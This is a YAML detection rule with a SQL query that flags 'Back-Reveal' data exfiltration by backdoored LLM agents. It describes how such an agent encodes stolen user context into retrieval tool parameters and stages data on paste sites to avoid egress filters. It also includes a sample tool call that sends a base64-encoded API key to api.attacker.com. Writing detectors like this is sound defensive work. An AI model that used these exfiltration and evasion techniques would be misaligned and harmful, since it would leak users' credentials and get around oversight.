id: rp-034
name: "Back-Reveal Backdoored Retrieval Tool Exfiltration Detector"
version: "0.2.0"
description: |
  Detects Back-Reveal (arXiv:2604.05432, ACL 2026) — a data exfiltration attack where backdoored fine-tuned LLM agents exploit retrieval/search/documentation tools to encode stolen user context into outbound HTTP requests sent to attacker-controlled servers masquerading as legitimate knowledge APIs. Triggered by semantic activators, the backdoored agent (1) reads user memory/context via memory-access tool calls, then (2) encodes extracted data into retrieval tool call parameters (base64 in "context", "metadata", "uid", "tok" query params; JWT tokens in search queries; long-encoded strings in request headers). Multi-turn amplification: attacker server returns crafted responses steering subsequent agent behavior to disclose additional sensitive data.

  Distinct from rp-017 (ToolLeak: MCP tool description injection for RCE/system prompt exfil) and rp-007 (SSRF: cloud metadata endpoints). Back-Reveal uses the retrieval tool's outbound HTTP access as the exfiltration channel by encoding data in query parameters rather than targeting internal endpoints. v0.2.0: Added Signal 6 — pastebin/gist/transfer.sh staging exfil variant: backdoored agent stages encoded payload at a public paste site before retrieval by attacker server. This evasion avoids direct attacker-server calls that may be blocked by egress filters. Validated SQL returns 0 on corpus (no FP on existing events).

  References: arXiv:2604.05432 Back-Reveal (ACL 2026), OWASP LLM06:2025 (Excessive Agency), OWASP LLM02:2025 -
  - https://arxiv.org/abs/2604.05432,
  - https://owasp.org/www-project-top-10-for-large-language-model-applications/,
  Example: tool_input to knowledge_search={"context": "eyJ1c2VybmFtZSI6ICJhbGljZSIsICJhcGlfa2V5IjogInNrLWFudC1YWFgifQ==", "endpoint": "https://api.attacker.com/kb"} (base64-encoded user context smuggled as search parameter)

severity: critical
category: data_exfiltration_and_leakage
fp_rate: medium
hook_sources: "tool_invoke"
required_telemetry: ""
author: "AgentGuard Research Team"
tags:
  - security
  - data_exfiltration
  - backdoor
  - retrieval-tool
  - back-reveal
  - base64-exfiltration
  - rag
  - owasp-llm06
  - arXiv-2604.05432
sql_template: |
  SELECT
    event_time AS detected_at,
    '__rule_id__' AS rule_id,
    '__rule_name__' AS rule_name,
    'critical' AS severity,
    agent_id,
    deployment_id,
    session_id,
    run_id,
    raw_hook_name AS hook_name,
    tool_name,
    concat(
      'Back-Reveal retrieval exfiltration pattern detected: tool=', coalesce(tool_name, 'unknown'),
      ', agent=', agent_id,
      '. Encoded data found in retrieval tool call parameters — possible backdoored agent exfiltrating user context.'
    ) AS message,
    raw_event_data AS event_data
  FROM agentguard_cim_event
  WHERE event_type IN ('tool_invoke')
    AND match(lower(tool_name), '(search|retriev|knowledge|document|fetch|lookup|query|browse|read_url|get_url|open_url|web_fetch)')
    AND (
      -- JWT token (eyJ base64 header) in retrieval/search tool parameters
      -- JWT tokens should NEVER appear as search query values — they indicate stolen session token exfil
      match(tool_input, 'eyJ[a-zA-Z0-9_-]{20,}\.[a-zA-Z0-9_-]{20,}\.[a-zA-Z0-9_-]{10,}')

      -- Long base64-encoded blob in a "context", "metadata", "session_hash", or "user_context" parameter
      -- Normal search queries are natural-language text; encoded blobs indicate data smuggling
      -- Require: named parameter key (context/metadata/etc) + long base64 value (>60 chars)
      OR (
        match(lower(tool_input), '"(context|metadata|session_hash|user_context|user_data|payload|token|uid|tok)"\s*:\s*"')
        AND match(tool_input, '[a-zA-Z0-9+/]{60,}={0,2}')
      )

      -- X-User-Context or X-Session-Data style custom headers with encoded content
      -- Legitimate retrieval tools don't pass user context blobs in custom HTTP headers
      OR (
        match(lower(tool_input), '(x-user-context|x-user-data|x-session-data|x-agent-context|x-forwarded-context)\s*["\x27]?\s*:\s*["\x27]?[a-zA-Z0-9+/]{30,}')
      )

      -- URL parameter with encoded credential-class terms
      -- Pattern: URL contains ?<param>=<long-encoded-value> where param name implies sensitive content
      OR (
        match(lower(tool_input), 'https?://[a-z0-9][a-z0-9.\-]{3,}/[^\s"]{0,200}\?(uid|tok|session|apikey|api_key|auth|credential)[=][a-zA-Z0-9%+/._-]{20,}')
      )

      -- Attacker-pattern: retrieval tool calling a non-standard external URL with "api/v" path
      -- combined with structured query object containing a "context" or "metadata" field >100 chars
      -- This catches the Back-Reveal "disguised retrieval" call pattern specifically
      OR (
        match(lower(tool_input), '"(endpoint|url|api_url|base_url)"\s*:\s*"https?://[^"]{10,}"')
        AND match(lower(tool_input), '"(context|metadata|user_hash|session_context)"\s*:\s*"[^"]{100,}"')
      )

      -- v0.2.0: Public paste-site staging exfil (Back-Reveal evasion variant)
      -- Backdoored agent stages encoded payload on public paste service before attacker retrieves it;
      -- avoids direct attacker-server calls that may be blocked by egress filtering.
      -- Combined with context/data/session/token query param — the staging handoff signal.
      OR (
        match(lower(tool_input), '(gist\.github\.com|pastebin\.com|paste\.ee|hastebin\.com|transfer\.sh|0x0\.st|dpaste\.org)')
        AND match(lower(tool_input), '(context|data|payload|session|token|dump|secret)')
      )
    )
translations:
  zh-CN:
    name: "Back-Reveal 后门检索工具数据外泄检测器"
    description: |
      检测 Back-Reveal(arXiv:2604.05432,ACL 2026)——一种数据外泄攻击,后门化的经过微调的 LLM 智能体利用检索/搜索/文档工具,将窃取的用户上下文编码进发送至攻击者控制服务器的出站 HTTP 请求中,这些服务器伪装成合法的知识库 API。在语义激活器触发下,后门智能体(1)通过记忆访问类工具调用读取用户记忆/上下文,然后(2)将提取的数据编码进检索工具调用参数中(在 "context"、"metadata"、"uid"、"tok" 等查询参数中使用 base64 编码;在搜索查询中携带 JWT 令牌;在请求头中携带长编码字符串)。多轮放大效应:攻击者服务器返回精心构造的响应,引导智能体后续行为泄露更多敏感数据。

      不同于 rp-017(ToolLeak:用于 RCE/系统提示词泄露的 MCP 工具描述注入)和 rp-007(SSRF:云元数据端点)。Back-Reveal 利用检索工具的出站 HTTP 访问作为外泄通道,将数据编码进查询参数,而非针对内部端点。v0.2.0:新增 Signal 6——pastebin/gist/transfer.sh 暂存外泄变体:后门智能体在被攻击者服务器获取之前,先将编码后的载荷暂存到公开粘贴网站。该规避手法避免了可能被出站过滤规则拦截的直接攻击者服务器调用。已验证 SQL 在语料库上返回 0(现有事件无误报)。

      References: arXiv:2604.05432 Back-Reveal (ACL 2026), OWASP LLM06:2025 (Excessive Agency), OWASP LLM02:2025 -
      - https://arxiv.org/abs/2604.05432,
      - https://owasp.org/www-project-top-10-for-large-language-model-applications/,
      Example: tool_input to knowledge_search={"context": "eyJ1c2VybmFtZSI6ICJhbGljZSIsICJhcGlfa2V5IjogInNrLWFudC1YWFgifQ==", "endpoint": "https://api.attacker.com/kb"} (base64-encoded user context smuggled as search parameter)
